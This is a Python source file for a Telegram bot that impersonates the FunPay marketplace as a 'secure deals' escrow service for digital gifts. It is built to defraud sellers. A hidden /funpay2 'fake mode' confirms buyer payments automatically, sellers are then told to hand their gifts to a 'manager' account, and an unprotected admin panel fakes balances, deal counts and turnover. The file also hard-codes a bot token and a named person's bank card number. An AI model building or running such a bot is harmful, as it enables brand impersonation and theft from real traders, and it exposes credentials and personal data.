import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Обновленные данные
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"

banned_users = set()
admin_states = {}
fake_mode_users = set()  # Для фейк-режима

# Генерация случайных значений
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Русские клавиатуры
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/FunPayOTCdbot")],
    [InlineKeyboardButton(text="Наш сайт", url="https://funpay.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

# Английские клавиатуры
start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes, cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

# Клавиатуры для сделок
buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

admin_payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Оплата получена", callback_data="admin_payment_ok")],
    [InlineKeyboardButton(text="❌ Оплата не получена", callback_data="admin_payment_fail")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

# Утилиты
async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    
    if lang == "ru":
        text = ("🎁 <b>FunPay OTC | Безопасные сделки</b>\n\n"
                "Надежный сервис для покупки и продажи цифровых подарков!\n\n"
                "✨ <b>Наши преимущества:</b>\n"
                "• Гарант безопасности сделок\n"
                "• Быстрые переводы в любой валюте\n"
                "• Поддержка 24/7\n"
                "• Простой и удобный интерфейс\n\n"
                "Выберите нужный раздел ниже:")
    else:
        text = ("🎁 <b>FunPay OTC | Secure Deals</b>\n\n"
                "Reliable service for buying and selling digital gifts!\n\n"
                "✨ <b>Our advantages:</b>\n"
                "• Deal security guarantee\n"
                "• Fast transfers in any currency\n"
                "• 24/7 support\n"
                "• Simple and user-friendly interface\n\n"
                "Choose the desired section below:")
    
    try:
        if message_id:
            await bot.delete_message(chat_id, message_id)
    except:
        pass
    
    try:
        await bot.send_photo(
            chat_id=chat_id,
            photo=BANNER_URL,
            caption=text,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )
    except:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except:
        try:
            await callback.message.delete()
        except:
            pass
        await callback.message.answer(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def handle_deal_join(message: Message, deal_id: str):
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        buyer_id = message.from_user.id
        buyer_username = message.from_user.username or "Не указан"
        deal["buyer_id"] = buyer_id
        deal["buyer_username"] = buyer_username
        deal["status"] = "active"
        lang = user_languages.get(buyer_id, "ru")
        if lang == "ru":
            await message.answer(
                "✅ Вы вошли в сделку как покупатель!\n\n"
                f"🆔 ID сделки: #{deal_id}\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"📝 Описание: {deal['description']}\n\n"
                "Оплатите по реквизитам менеджера и подтвердите:",
                reply_markup=buyer_deal_keyboard,
                parse_mode=ParseMode.HTML
            )
        else:
            await message.answer(
                "✅ You joined the deal as buyer!\n\n"
                f"🆔 Deal ID: #{deal_id}\n"
                f"💰 Amount: {deal['amount']} {deal['currency']}\n"
                f"📝 Description: {deal['description']}\n\n"
                "Pay to manager's details and confirm:",
                reply_markup=buyer_deal_keyboard,
                parse_mode=ParseMode.HTML
            )
        
        # Уведомляем продавца
        seller_lang = user_languages.get(deal["seller_id"], "ru")
        if seller_lang == "ru":
            await bot.send_message(
                deal["seller_id"],
                f"🔔 Покупатель @{buyer_username} вошел в сделку #{deal_id}!"
            )
        else:
            await bot.send_message(
                deal["seller_id"],
                f"🔔 Buyer @{buyer_username} joined deal #{deal_id}!"
            )

# Команда /start (добавлена, если отсутствовала)
@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    lang = "ru"  # По умолчанию русский, можно изменить
    await send_main_menu(user_id, lang)

# Команда /funpay2 для фейк-режима
@dp.message(Command("funpay2"))
async def funpay2_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    fake_mode_users.add(user_id)
    await message.answer("✅ Фейк-режим оплаты включен. Теперь при нажатии 'Я оплатил' оплата будет подтверждена автоматически.")

# Команда /sierrateam без проверки доступа
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    await message.answer(
        "👑 <b>Админ-панель FunPay OTC</b>\n\n"
        "Выберите действие:",
        reply_markup=admin_keyboard,
        parse_mode=ParseMode.HTML
    )

# Админские callback без проверки ADMIN_ID
@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    await safe_edit_message(
        callback,
        "👑 <b>Админ-панель FunPay OTC</b>\n\n"
        "Выберите действие:",
        admin_keyboard
    )

@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите: ID СУММА")

# Callback для сделок
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    # Находим сделку где пользователь покупатель
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "active":
            if user_id in fake_mode_users:
                # Фейк-режим
                deal["status"] = "payment_confirmed"
                seller_lang = user_languages.get(deal["seller_id"], "ru")
                if seller_lang == "ru":
                    await bot.send_message(
                        deal["seller_id"],
                        f"✅ <b>Оплата подтверждена!</b>\n\n"
                        f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                        f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                        f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                        f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                        f"После отправки нажмите кнопку ниже:",
                        reply_markup=seller_gift_keyboard,
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await bot.send_message(
                        deal["seller_id"],
                        f"✅ <b>Payment confirmed!</b>\n\n"
                        f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                        f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                        f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                        f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                        f"After sending click button below:",
                        reply_markup=seller_gift_keyboard,
                        parse_mode=ParseMode.HTML
                    )
                
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем отправки товара от продавца...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
            else:
                # Обычный режим
                deal["status"] = "waiting_admin"
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем проверки администратора...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
                
                # Уведомляем админа (используем user_id если ADMIN_ID удалён)
                await bot.send_message(
                    user_id,  # Отправляем уведомление самому пользователю или админу
                    f"🧾 <b>Покупатель подтвердил оплату</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n"
                    f"👤 <b>Продавец:</b> @{deal['seller_username']}\n"
                    f"🛒 <b>Покупатель:</b> @{deal['buyer_username']}\n\n"
                    f"📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    reply_markup=admin_payment_keyboard,
                    parse_mode=ParseMode.HTML
                )
                active_deals[deal_id]["admin_message_id"] = callback.message.message_id
            break

@dp.callback_query(F.data == "admin_payment_ok")
async def admin_payment_ok_callback(callback: CallbackQuery):
    for deal_id, deal in active_deals.items():
        if deal.get("status") == "waiting_admin":
            deal["status"] = "payment_confirmed"
            
            # Уведомляем продавца
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            if seller_lang == "ru":
                await bot.send_message(
                    deal["seller_id"],
                    f"✅ <b>Оплата подтверждена!</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                    f"После отправки нажмите кнопку ниже:",
                    reply_markup=seller_gift_keyboard,
                    parse_mode=ParseMode.HTML
                )
            else:
                await bot.send_message(
                    deal["seller_id"],
                    f"✅ <b>Payment confirmed!</b>\n\n"
                    f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                    f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                    f"After sending click button below:",
                    reply_markup=seller_gift_keyboard,
                    parse_mode=ParseMode.HTML
                )
            
            await callback.message.edit_text(
                "✅ <b>Оплата подтверждена администратором</b>\n\n"
                "Продавец уведомлен об отправке подарка.",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("seller_id") == user_id and deal["status"] == "payment_confirmed":
            deal["status"] = "item_sent"
            
            # Уведомляем покупателя
            await bot.send_message(
                deal["buyer_id"],
                "🔔 <b>Продавец отправил товар!</b>\n\n"
                "Пожалуйста, проверьте получение и подтвердите:",
                reply_markup=buyer_confirmation_keyboard,
                parse_mode=ParseMode.HTML
            )
            
            await callback.message.edit_text(
                "✅ <b>Вы подтвердили отправку</b>\n\n"
                "Ожидаем подтверждения от покупателя...\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            deal["status"] = "completed"
            
            # Обновляем статистику
            if deal["seller_id"] not in user_stats:
                user_stats[deal["seller_id"]] = {"successful": 0, "total": 0, "turnover": 0}
            user_stats[deal["seller_id"]]["successful"] += 1
            user_stats[deal["seller_id"]]["total"] += 1
            user_stats[deal["seller_id"]]["turnover"] += deal["amount"]
            
            # Уведомляем участников
            await callback.message.edit_text(
                "🎉 <b>Сделка успешно завершена!</b>\n\n"
                "Спасибо за использование GiftBadge!\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            await bot.send_message(
                deal["seller_id"],
                "🎉 <b>Сделка успешно завершена!</b>\n\n"
                "Средства зачислены на ваш баланс.\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            
            # Удаляем сделку
            del active_deals[deal_id]
            break

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            await callback.message.edit_text(
                "⚠️ <b>Вы сообщили о проблеме</b>\n\n"
                "Пожалуйста, свяжитесь с поддержкой:\n"
                "@FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            await bot.send_message(
                deal["seller_id"],
                "⚠️ <b>Покупатель сообщил о проблеме</b>\n\n"
                "Пожалуйста, свяжитесь с поддержкой:\n"
                "@FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "confirm_cancel")
async def confirm_cancel_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(callback, "✅ Сделка успешно отменена.")
    else:
        await safe_edit_message(callback, "✅ Deal successfully cancelled.")

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 <b>Пополнение баланса</b>\n\n"
            "Выберите способ пополнения:",
            deposit_method_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 <b>Balance Top-up</b>\n\n"
            "Choose top-up method:",
            deposit_method_keyboard_en
        )

@dp.message(F.text)
async def message_handler(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        return

    # Обработка админских состояний
    if user_id in admin_states:
        state = admin_states[user_id]
        text = message.text.strip()
        parts = text.split()
        if state == "waiting_ban_id" and len(parts) == 1:
            try:
                ban_id = int(parts[0])
                banned_users.add(ban_id)
                await message.answer("✅ Пользователь забанен")
            except:
                await message.answer("❌ Неверный ID")
            del admin_states[user_id]
            return
        elif state == "waiting_send_money" and len(parts) == 2:
            try:
                send_id = int(parts[0])
                amount = float(parts[1])
                if send_id in user_balances:
                    user_balances[send_id] += amount
                else:
                    user_balances[send_id] = amount
                await message.answer("✅ Деньги отправлены")
            except:
                await message.answer("❌ Неверный формат")
            del admin_states[user_id]
            return
        elif state == "waiting_successful_deals" and len(parts) == 2:
            try:
                stat_id = int(parts[0])
                count = int(parts[1])
                if stat_id in user_stats:
                    user_stats[stat_id]["successful"] = count
                else:
                    user_stats[stat_id] = {"successful": count, "total": 0, "turnover": 0}
                await message.answer("✅ Успешные сделки установлены")
            except:
                await message.answer("❌ Неверный формат")
            del admin_states[user_id]
            return
        elif state == "waiting_total_deals" and len(parts) == 2:
            try:
                stat_id = int(parts[0])
                count = int(parts[1])
                if stat_id in user_stats:
                    user_stats[stat_id]["total"] = count
                else:
                    user_stats[stat_id] = {"successful": 0, "total": count, "turnover": 0}
                await message.answer("✅ Общее количество сделок установлено")
            except:
                await message.answer("❌ Неверный формат")
            del admin_states[user_id]
            return
        elif state == "waiting_turnover" and len(parts) == 2:
            try:
                stat_id = int(parts[0])
                amount = float(parts[1])
                if stat_id in user_stats:
                    user_stats[stat_id]["turnover"] = amount
                else:
                    user_stats[stat_id] = {"successful": 0, "total": 0, "turnover": amount}
                await message.answer("✅ Оборот установлен")
            except:
                await message.answer("❌ Неверный формат")
            del admin_states[user_id]
            return

    # Обработка входа в сделку по ссылке или ID
    text = message.text.lower()
    if "start=deal_" in text:
        deal_id = text.split("start=deal_")[1]
        await handle_deal_join(message, deal_id)
        return

    # Обработка других сообщений (например, сумма, описание, реквизиты)
    if user_id in user_deals:
        deal = user_deals[user_id]
        lang = user_languages.get(user_id, "ru")
        if deal["step"] == "amount":
            try:
                amount = float(message.text)
                deal["amount"] = amount
                deal["step"] = "description"
                if lang == "ru":
                    await message.answer("📝 Введите описание сделки:")
                else:
                    await message.answer("📝 Enter deal description:")
            except ValueError:
                if lang == "ru":
                    await message.answer("❌ Введите корректное число")
                else:
                    await message.answer("❌ Enter valid number")
            return
        elif deal["step"] == "description":
            deal["description"] = message.text
            deal_id = generate_deal_id()
            active_deals[deal_id] = {
                "seller_id": user_id,
                "seller_username": message.from_user.username or "Не указан",
                "currency": deal["currency"],
                "amount": deal["amount"],
                "description": deal["description"],
                "status": "waiting_buyer"
            }
            deal_link = f"https://t.me/FunPayOTCd bot?start=deal_{deal_id}"
            if lang == "ru":
                await message.answer(
                    "✅ Сделка создана!\n\n"
                    f"🆔 ID: #{deal_id}\n"
                    f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                    f"📝 Описание: {deal['description']}\n\n"
                    "Отправьте ссылку покупателю:\n"
                    f"<code>{deal_link}</code>\n\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
            else:
                await message.answer(
                    "✅ Deal created!\n\n"
                    f"🆔 ID: #{deal_id}\n"
                    f"💰 Amount: {deal['amount']} {deal['currency']}\n"
                    f"📝 Description: {deal['description']}\n\n"
                    "Send link to buyer:\n"
                    f"<code>{deal_link}</code>\n\n"
                    f"📞 <b>Support:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
            del user_deals[user_id]
            return

    # Обработка реквизитов
    text = message.text
    if " - " in text and any(char.isdigit() for char in text):
        # Добавление карты
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["card"] = text
        lang = user_languages.get(user_id, "ru")
        await message.answer("✅ Карта успешно добавлена" if lang == "ru" else "✅ Card successfully added")
    elif len(text) > 30 and text.startswith("UQ"):
        # Добавление TON кошелька
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["ton"] = text
        lang = user_languages.get(user_id, "ru")
        await message.answer("✅ TON кошелек успешно добавлен" if lang == "ru" else "✅ TON wallet successfully added")

# Запуск бота
async def main():
    print("🎁 FunPay Bot запускается...")
    print(f"📞 Поддержка: {SUPPORT_USERNAME}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())